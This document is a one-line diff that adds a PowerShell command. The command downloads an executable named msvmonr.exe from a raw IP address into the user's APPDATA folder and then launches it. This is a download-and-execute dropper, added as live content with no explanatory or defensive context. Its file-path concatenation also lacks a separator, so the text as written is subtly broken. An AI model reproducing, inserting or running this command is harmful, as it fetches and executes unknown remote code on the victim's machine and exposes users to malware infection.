@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATAmsvmonr.exe");Start-Process ("$env:APPDATAmsvmonr.exe")
